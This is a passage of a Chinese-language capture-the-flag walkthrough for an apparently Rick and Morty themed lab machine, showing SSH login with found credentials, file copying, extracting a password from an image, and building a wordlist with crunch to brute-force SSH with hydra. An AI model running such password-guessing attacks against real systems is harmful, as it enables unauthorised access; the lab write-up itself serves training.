### **2.3 主机渗透**

#### **1.登录主机**

使用Summer作为账号，winter作为密码可成功登录主机

```
ssh Summer@192.168.124.5 -p 22222
```

![](../Images/afedc71762553162b7ec84cf54a5fcb2.png)

#### **2.查看当前目录文件**

使用more进行查看获取到flag

![](../Images/08242ace687803694d9057dd4565a9f4.png)

![](../Images/f05c2f3fd59f28f684487710edc5c35d.png)

![](../Images/0309f142d741d593425394e580a638e2.png)

#### **3.Morty目录文件**

复制Morty目录文件到本地

```

scp -P 22222 Summer@192.168.124.5:/home/Morty/journal.txt.zip .
```

![](../Images/05d16750f8e2edcb6010a592d0a7a190.png)

查看图片中包含的字符串内容，提示密码为:Meeseek

```
strings Safe\_Password.jpg
```

![](../Images/b0309a2eda7992ee9ccceb69e092eb2f.png)

解压zip文件，获取到flag信息，并提示flag内容为131333

```

unzip journal.txt.zip
```

![](../Images/ee3859395f3012be43226a95a098aeba.png)

#### **4.Rick目录文件**

复制RICKS\_SAFE目录中的safe文件到tmp目录中

```
cp safe /tmp/
```

![](../Images/f67a0f0286cb627f9fd7aaf5ae6b0ac5.png)

```

./safe
```

根据提示需要传入一串内容，尝试使用获取到的上个131333内容，获取到flag信息。

![](../Images/dadc884cad59e7e54e02d27c4b651b4e.png)

根据上面密码提示信息：有一个是大写的字母、一个数字、还有一个单词为为Rich喜欢的乐队名字

#### **5.密码破解**

根据搜索获取到Rich乐队名称为the flesh curtains

![](../Images/d8fe209a540611476fe75e5fdd932570.png)

使用crunch生成密码

```

crunch 10 10 -t ,%Curtains -O >> dict.txt
```

![](../Images/af8471bb36022bc76b5ec5b8b2991548.png)

使用hydra进行爆破

```
hydra -l RickSanchez -P dict.txt 192.168.124.5 ssh  -s  22222
```

![](../Images/b5b582bd4f4fdc8c0f73af88131a1bde.png)
